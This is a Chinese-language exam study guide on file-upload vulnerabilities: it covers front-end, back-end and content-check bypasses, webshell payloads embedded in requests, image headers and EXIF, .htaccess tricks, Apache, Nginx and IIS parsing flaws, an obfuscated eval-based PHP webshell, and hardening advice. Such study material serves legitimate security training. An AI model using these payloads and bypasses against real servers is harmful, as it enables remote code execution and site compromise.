# 文件上传漏洞挖掘与解析漏洞

> **📘 文档定位**：CISP 考试 漏洞挖掘 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解文件上传漏洞的挖掘方法、解析漏洞利用、WAF 绕过技巧及安全防护方案，覆盖前端/后端/中间件全链路绕过技术。

---

## 导航目录

- [一、漏洞概述](#一漏洞概述)
- [二、前端绕过技术](#二前端绕过技术)
- [三、后端绕过技术](#三后端绕过技术)
- [四、解析漏洞利用](#四解析漏洞利用)
- [五、WAF 绕过技巧](#五waf-绕过技巧)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、漏洞概述

文件上传漏洞是指应用允许用户上传文件，但对文件类型、内容、后缀、路径缺乏充分校验，导致恶意脚本（WebShell）被上传并在服务端执行。结合 Web 服务器的解析漏洞，即使扩展名被限制为图片，仍可能被当作脚本执行。

| 项目 | 说明 |
|------|------|
| 典型危害 | WebShell、远程代码执行、控制整站、内网横向 |
| 核心判断依据 | 上传的文件能否被服务端以脚本方式解析执行 |
| 相关工具 | Webshell 生成（weevely、b374k）、文件格式识别（pngcheck、gifsicle） |

## 2. 前端 / 后端校验层级分析

### 2.1 仅前端校验（JS）

常见表现：

- 弹窗提示"只能上传 jpg/png"
- 表单提交前 JS 检查 `file.type` / `.split('.').pop()`

绕过方法：

1. 使用 Burp Repeater 直接修改包体，绕过前端脚本
2. 浏览器禁用 JavaScript，直接上传
3. 修改文件后缀后再通过开发者工具改回原文件名

### 2.2 Content-Type 校验

后端读取 `Content-Type: image/png` 判断类型，可直接修改 HTTP Header：

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php eval($_POST[1]); ?>
```

### 2.3 文件后缀黑名单

黑名单如 `php|php5|phtml|jsp|asp|aspx|exe`。常见绕过：

```
# 更换可解析后缀（PHP 场景）
shell.phtml
shell.php5
shell.php7
shell.phar
shell.php/
shell.php.
shell.php%00.png  # 00 截断（需 PHP 低版本 < 5.3.4）
shell.pHp         # 大小写绕过（Windows + IIS/Apache）
shell.php.jpg     # 利用解析漏洞（见第三节）
shell.php.xxx.yyy # 部分中间件取最后一个合法后缀前的内容
```

### 2.4 文件后缀白名单

白名单如仅允许 `jpg|jpeg|png|gif|bmp`。绕过思路：

1. **解析漏洞**：如 `shell.php.jpg` 在 Apache/Nginx 特定配置下可被解析为 PHP
2. **%00 截断**：`shell.php%00.jpg`
3. **Apache .htaccess**：若允许上传 `.htaccess` 且启用 AllowOverride，可自定义后缀解析
4. **IIS 短文件名 / PUT 方法写入脚本**
5. **.user.ini / auto_prepend_file**（PHP-CGI 场景）

### 2.5 文件内容校验

服务端读取文件头 magic bytes 或执行 `getimagesize()`。绕过方法：

```
# 在文件头加入 GIF 签名 + 紧跟 PHP 代码
GIF89a
<?php eval($_POST[1]); ?>

# 更稳妥做法：将 PHP 代码写进图像注释 / EXIF
jpg: exiftool -Comment='<?php eval($_POST[1]); ?>' fake.jpg
png: 使用 xca / tweakpng 在 iTXt / tEXt chunk 中写入 payload
gif: 使用 gifsicle 等工具在注释扩展块写入 payload

# 文件尾追加（针对仅校验开头）
copy normal.jpg /b + shell.php /b combo.jpg
```

## 3. Web 服务器解析漏洞

### 3.1 Apache

```
# 场景 1：mod_php 的多后缀解析
# 访问 /uploads/shell.php.jpg 时 Apache 从右向左识别合法后缀，
# 不认识 .jpg 就向前看，识别到 .php 则交给 PHP 处理器
# 修复：<FilesMatch "\.php$"> 精确匹配

# 场景 2：AddHandler / AddType 配置不严谨
AddType application/x-httpd-php .php
# 若上传 shell.php.xxx 可能被解析

# 场景 3：.htaccess 允许上传
# 上传 .htaccess 内容为
AddType application/x-httpd-php .jpg
# 之后所有 .jpg 都以 PHP 执行
```

### 3.2 Nginx

```
# 场景 1：文件路径解析漏洞（CVE-2013-4547 及老配置）
# 访问 /uploads/shell.jpg/a.php / /uploads/shell.jpg%00.php

# 场景 2：cgi.fix_pathinfo = 1 + PHP 配置不严谨
# 访问 /uploads/shell.jpg/index.php，PHP 会去解析 shell.jpg
# 修复：cgi.fix_pathinfo = 0 或严格限制 SCRIPT_FILENAME

# 场景 3：Nginx 在 location ~ \.php$ 内部用 try_files
# 若 try_files 没写好可能导致通过任意文件包含执行脚本
```

### 3.3 IIS

```
# IIS 6.0
# 目录解析：/xxx.asp/1.jpg → 以 ASP 解析 1.jpg
# 分号解析：shell.asp;.jpg → 以 ASP 解析

# IIS 7.x + PHP
# 类似 Nginx 的 cgi.fix_pathinfo 场景
# 访问 /shell.jpg/a.php 触发解析
```

## 4. 综合实战流程

1. **上传正常文件**（真实图片），确认上传成功并得到文件 URL。
2. **上传同名 shell.php**，观察失败原因：前端校验 / 后缀 / MIME / 文件内容。
3. **逐一尝试绕过**：
   - 改后缀 `.phtml / .php5 / .phar`
   - 改 Content-Type 为 `image/png`
   - 拼接 GIF89a 头
   - 利用解析漏洞：`shell.php.jpg` / `shell.jpg/a.php`
   - 上传 `.htaccess` / `.user.ini` / `web.config`
4. **访问上传路径**，确认是否以脚本方式执行。
5. **升级 WebShell**：使用菜刀 / 蚁剑 / 冰蝎 / weevely 连接，执行系统命令。

一个简单的 WebShell 模板（PHP）：

```php
<?php
$pass = 'x';
@eval(gzinflate(base64_decode($_POST[$pass])));
```

更隐蔽的冰蝎 / 哥斯拉等工具会使用加密协议、反序列化入口、回调方式绕过流量检测。

## 5. 修复建议

1. **文件类型白名单**：使用严格的 MIME + 扩展名 + 文件头校验（如 `finfo` 魔术字节），且三者一致才放行。
2. **禁止脚本解析**：上传目录禁止执行权限；Nginx/Apache 配置中对 `uploads/` `static/` 目录关闭 PHP / JSP / ASP 处理器。
3. **文件名与路径重写**：使用随机文件名，剥离用户指定路径，避免 `../` 目录穿越。
4. **上传权限最小化**：上传目录与应用代码目录分离；使用独立存储（OSS / 独立静态服务器）。
5. **用户隔离**：Web 进程以低权限用户运行；禁用危险函数（`system`、`exec`、`eval`、`assert` 等）。
6. **定期审计**：定期扫描上传目录是否出现脚本文件，限制上传文件大小。
